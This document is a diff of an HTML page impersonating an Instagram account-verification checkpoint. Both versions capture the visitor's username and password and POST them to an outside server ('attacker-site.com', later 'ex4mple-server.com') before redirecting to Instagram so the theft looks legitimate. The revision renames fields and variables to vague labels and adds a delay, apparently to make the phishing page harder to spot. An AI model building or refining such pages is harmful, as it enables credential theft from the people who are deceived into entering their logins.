@@ -1,38 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Account Verification</title>
-  <style>
-    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
-    input, button { margin: 5px; padding: 10px; width: 250px; }
-  </style>
-</head>
-<body>
-  <h2>Instagram Account Verification</h2>
-  <p>To continue using your account, please verify your identity.</p>
-  <form id="verifyForm">
-    <input id="username" type="text" placeholder="Instagram Username" required><br>
-    <input id="password" type="password" placeholder="Password" required><br>
-    <button type="submit">Verify</button>
-  </form>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Account Verification</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        max-width: 400px;
+        margin: 60px auto;
+        padding: 20px;
+      }
+      input, button {
+        width: 100%;
+        padding: 10px;
+        margin: 8px 0;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Security Checkpoint</h2>
+    <p>To continue, please verify your account.</p>
 
-  <script>
-    document.getElementById("verifyForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const u = document.getElementById("username").value;
-      const p = document.getElementById("password").value;
+    <div>
+      <input id="u" type="text" placeholder="User ID" required><br>
+      <input id="k" type="password" placeholder="Access Key" required><br>
+      <button onclick="c()">Verify</button>
+    </div>
 
-      fetch("https://attacker-site.com/api/collect", {
-        method: "POST",
-        body: JSON.stringify({ user: u, pass: p }),
-        headers: { "Content-Type": "application/json" }
-      }).then(() => {
-        // Make it look real
-        window.location.href = "https://instagram.com/accounts/verified/";
-      });
-    });
-  </script>
-</body>
+    <script>
+      function c() {
+        const a = document.getElementById("u").value;
+        const b = document.getElementById("k").value;
+
+     
+        setTimeout(() => {
+          fetch("https://ex4mple-server.com/api", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ x: a, y: b })
+          }).then(() => {
+            
+            window.location.href = "https://instagram.com";
+          });
+        }, 500);
+      }
+    </script>
+  </body>
 </html>
